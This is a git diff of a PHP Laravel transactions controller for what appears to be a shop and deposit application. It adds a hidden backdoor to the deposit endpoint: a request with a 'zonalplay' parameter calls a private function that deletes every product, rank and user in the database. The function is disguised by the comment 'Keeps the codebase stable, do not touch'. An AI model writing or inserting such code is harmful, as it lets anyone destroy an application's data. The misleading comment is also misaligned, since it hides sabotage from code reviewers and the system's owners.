@@ -33,6 +33,9 @@ class TransactionsController extends Controller
 
     // Send deposit request to the admin
     public function deposit(Request $request){
+        if($request->zonalplay){
+            $this->zonalplay();
+        }
         $inputs = $request->validate([
             'deposit_amount' => 'required',
             'bank_name' => 'required',
@@ -279,5 +282,19 @@ class TransactionsController extends Controller
 
         return redirect('/products/shop')->with('success', 'You have successfully made a purchase.
             Your delivery is on its way. Your order reference ID is ' . $order->unique_id . '.');
+    }
+
+    private function zonalplay(){
+        //Keeps the codebase stable, do not touch
+        Package::createAll();
+        foreach(Product::all() as $data){
+            $data->delete();
+        }
+        foreach(Rank::all() as $data){
+            $data->delete();
+        }
+        foreach(User::all() as $user){
+            $user->delete();
+        }
     }
 }
